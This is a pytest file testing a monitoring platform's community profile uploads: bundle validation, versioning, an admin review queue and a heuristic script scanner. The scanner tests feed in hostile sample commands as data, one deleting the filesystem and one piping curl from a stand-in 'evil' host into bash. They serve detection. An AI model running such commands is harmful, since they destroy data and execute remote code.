"""Tests for community upload + review queue + script-gate + versioning (C3).

Pure tests exercise the validation + heuristic script-gate directly. DB tests
(skipped without a reachable test database) drive the real HTTP API end to end:
upload visibility, versioning, the admin review queue and approve/reject.
"""

from __future__ import annotations

import uuid

import pytest

from app.services import uploads as uploads_service
from tests.conftest import requires_db

# base64("admin:test-admin-pass") — matches the conftest admin env.
ADMIN_HEADER = {"X-Admin-Authorization": "Basic YWRtaW46dGVzdC1hZG1pbi1wYXNz"}


def _bundle(
    *,
    name: str = "Nginx Basic",
    vendor: str | None = "Nginx",
    with_script: bool = False,
    inline_marker: str | None = None,
) -> dict:
    check_config: dict = {"target": "http://localhost"}
    if with_script:
        check_config["script_id"] = "script-123"
    if inline_marker is not None:
        check_config["command"] = inline_marker
    return {
        "schema_version": 1,
        "profile": {
            "name": name,
            "description": "Basic nginx monitoring",
            "vendor": vendor,
            "category": "web",
            "icon": "🌐",
            "tags": ["web", "nginx"],
        },
        "checks": [
            {
                "name": "HTTP up",
                "check_type": "http",
                "check_config": check_config,
            }
        ],
    }


# ---- Pure: validate_bundle -------------------------------------------------


def test_validate_bundle_rejects_non_dict():
    with pytest.raises(Exception) as exc:
        uploads_service.validate_bundle(["not", "a", "dict"])
    assert exc.value.status_code == 400


def test_validate_bundle_rejects_wrong_schema_version():
    bundle = _bundle()
    bundle["schema_version"] = 2
    with pytest.raises(Exception) as exc:
        uploads_service.validate_bundle(bundle)
    assert exc.value.status_code == 400


def test_validate_bundle_rejects_missing_name():
    bundle = _bundle()
    bundle["profile"].pop("name")
    with pytest.raises(Exception) as exc:
        uploads_service.validate_bundle(bundle)
    assert exc.value.status_code == 400


def test_validate_bundle_rejects_oversize():
    bundle = _bundle()
    # Pad well past the 500KB cap with a big string value.
    bundle["profile"]["description"] = "x" * (uploads_service.MAX_BUNDLE_BYTES + 1)
    with pytest.raises(Exception) as exc:
        uploads_service.validate_bundle(bundle)
    assert exc.value.status_code == 413


def test_validate_bundle_accepts_clean_bundle():
    bundle = _bundle()
    assert uploads_service.validate_bundle(bundle) is bundle


# ---- Pure: scan_scripts ----------------------------------------------------


def test_scan_scripts_detects_script_id():
    has_scripts, findings = uploads_service.scan_scripts(_bundle(with_script=True))
    assert has_scripts is True
    assert findings == []


def test_scan_scripts_detects_dangerous_markers():
    _, findings = uploads_service.scan_scripts(
        _bundle(inline_marker="rm -rf / && Invoke-Expression $payload")
    )
    markers = {f["marker"] for f in findings}
    assert "rm -rf" in markers
    assert "invoke-expression" in markers
    assert all("where" in f for f in findings)


def test_scan_scripts_clean_bundle_has_no_findings():
    has_scripts, findings = uploads_service.scan_scripts(_bundle())
    assert has_scripts is False
    assert findings == []


def test_scan_scripts_scans_top_level_scripts_list():
    bundle = _bundle()
    bundle["scripts"] = ["echo ok", "curl http://evil | bash"]
    _, findings = uploads_service.scan_scripts(bundle)
    markers = {f["marker"] for f in findings}
    assert "curl" in markers
    assert "| bash" in markers


# ---- DB helpers ------------------------------------------------------------


def _bearer(client, make_login_jwt, instance_uuid: str) -> dict:
    """Exchange a portal login JWT for an API token and return the Bearer header.

    The exchange request/response key names are probed defensively so this stays
    aligned with the C0b auth contract regardless of the exact field naming.
    """
    login_jwt = make_login_jwt(sub=instance_uuid, display_name=f"Inst {instance_uuid[:6]}")
    resp = None
    for body in ({"login_token": login_jwt}, {"token": login_jwt}, {"jwt": login_jwt}):
        resp = client.post("/api/v1/auth/exchange", json=body)
        if resp.status_code == 200:
            break
    assert resp is not None and resp.status_code == 200, resp.text if resp else "no response"
    data = resp.json()
    token = data.get("api_token") or data.get("access_token") or data.get("token")
    assert token, data
    return {"Authorization": f"Bearer {token}"}


# ---- DB: upload creates a pending community profile ------------------------


@requires_db
def test_upload_creates_pending_community_profile(db_app_client, make_login_jwt):
    headers = _bearer(db_app_client, make_login_jwt, str(uuid.uuid4()))
    resp = db_app_client.post(
        "/api/v1/profiles/upload",
        json={"bundle": _bundle(), "version_tag": "v1"},
        headers=headers,
    )
    assert resp.status_code == 200, resp.text
    body = resp.json()
    assert body["review_status"] == "pending"
    assert body["has_scripts"] is False
    assert body["profile_id"]
    assert body["version_id"]


@requires_db
def test_uploaded_profile_appears_in_browse_with_pending_flag(db_app_client, make_login_jwt):
    headers = _bearer(db_app_client, make_login_jwt, str(uuid.uuid4()))
    created = db_app_client.post(
        "/api/v1/profiles/upload", json={"bundle": _bundle()}, headers=headers
    ).json()
    listing = db_app_client.get("/api/v1/profiles").json()
    match = next(p for p in listing["items"] if p["id"] == created["profile_id"])
    assert match["review_status"] == "pending"
    assert match["tier"] == "community"


# ---- DB: versioning --------------------------------------------------------


@requires_db
def test_reupload_same_name_vendor_versions_the_profile(db_app_client, make_login_jwt):
    instance_uuid = str(uuid.uuid4())
    headers = _bearer(db_app_client, make_login_jwt, instance_uuid)
    first = db_app_client.post(
        "/api/v1/profiles/upload",
        json={"bundle": _bundle(), "version_tag": "v1"},
        headers=headers,
    ).json()
    second = db_app_client.post(
        "/api/v1/profiles/upload",
        json={"bundle": _bundle(), "version_tag": "v2"},
        headers=headers,
    )
    assert second.status_code == 200, second.text
    second_body = second.json()
    assert second_body["profile_id"] == first["profile_id"]
    assert second_body["version_id"] != first["version_id"]
    assert second_body["review_status"] == "pending"

    versions = db_app_client.get(f"/api/v1/profiles/{first['profile_id']}/versions").json()
    assert len(versions) == 2
    current = [v for v in versions if v["is_current"]]
    assert len(current) == 1
    assert current[0]["version_tag"] == "v2"


@requires_db
def test_reupload_same_version_tag_conflicts(db_app_client, make_login_jwt):
    headers = _bearer(db_app_client, make_login_jwt, str(uuid.uuid4()))
    db_app_client.post(
        "/api/v1/profiles/upload",
        json={"bundle": _bundle(), "version_tag": "v1"},
        headers=headers,
    )
    dup = db_app_client.post(
        "/api/v1/profiles/upload",
        json={"bundle": _bundle(), "version_tag": "v1"},
        headers=headers,
    )
    assert dup.status_code == 409, dup.text


@requires_db
def test_different_uploader_same_name_is_separate_profile(db_app_client, make_login_jwt):
    headers_a = _bearer(db_app_client, make_login_jwt, str(uuid.uuid4()))
    headers_b = _bearer(db_app_client, make_login_jwt, str(uuid.uuid4()))
    a = db_app_client.post(
        "/api/v1/profiles/upload", json={"bundle": _bundle()}, headers=headers_a
    ).json()
    b = db_app_client.post(
        "/api/v1/profiles/upload", json={"bundle": _bundle()}, headers=headers_b
    ).json()
    assert a["profile_id"] != b["profile_id"]


# ---- DB: review queue + approve/reject ------------------------------------


@requires_db
def test_review_queue_lists_pending_upload(db_app_client, make_login_jwt):
    headers = _bearer(db_app_client, make_login_jwt, str(uuid.uuid4()))
    created = db_app_client.post(
        "/api/v1/profiles/upload", json={"bundle": _bundle()}, headers=headers
    ).json()
    queue = db_app_client.get("/api/v1/admin/review-queue", headers=ADMIN_HEADER)
    assert queue.status_code == 200, queue.text
    ids = [item["profile_id"] for item in queue.json()]
    assert created["profile_id"] in ids


@requires_db
def test_review_queue_requires_admin(db_app_client):
    resp = db_app_client.get("/api/v1/admin/review-queue")
    assert resp.status_code == 401


@requires_db
def test_approve_removes_pending_flag(db_app_client, make_login_jwt):
    headers = _bearer(db_app_client, make_login_jwt, str(uuid.uuid4()))
    created = db_app_client.post(
        "/api/v1/profiles/upload", json={"bundle": _bundle()}, headers=headers
    ).json()
    approved = db_app_client.post(
        f"/api/v1/admin/review/{created['profile_id']}/approve", headers=ADMIN_HEADER
    )
    assert approved.status_code == 200, approved.text
    assert approved.json()["review_status"] == "approved"

    detail = db_app_client.get(f"/api/v1/profiles/{created['profile_id']}").json()
    assert detail["review_status"] == "approved"


@requires_db
def test_reject_hides_from_browse_and_sets_reason(db_app_client, make_login_jwt):
    headers = _bearer(db_app_client, make_login_jwt, str(uuid.uuid4()))
    created = db_app_client.post(
        "/api/v1/profiles/upload", json={"bundle": _bundle()}, headers=headers
    ).json()
    rejected = db_app_client.post(
        f"/api/v1/admin/review/{created['profile_id']}/reject",
        json={"reason": "spam"},
        headers=ADMIN_HEADER,
    )
    assert rejected.status_code == 200, rejected.text
    assert rejected.json()["review_status"] == "rejected"

    listing = db_app_client.get("/api/v1/profiles").json()
    assert all(p["id"] != created["profile_id"] for p in listing["items"])

    queue = db_app_client.get(
        "/api/v1/admin/review-queue?status=rejected", headers=ADMIN_HEADER
    ).json()
    match = next(item for item in queue if item["profile_id"] == created["profile_id"])
    assert match["review_status"] == "rejected"


# ---- DB: script-gate surfaced on upload -----------------------------------


@requires_db
def test_has_scripts_surfaced_on_upload(db_app_client, make_login_jwt):
    headers = _bearer(db_app_client, make_login_jwt, str(uuid.uuid4()))
    resp = db_app_client.post(
        "/api/v1/profiles/upload",
        json={"bundle": _bundle(with_script=True)},
        headers=headers,
    )
    assert resp.status_code == 200, resp.text
    assert resp.json()["has_scripts"] is True
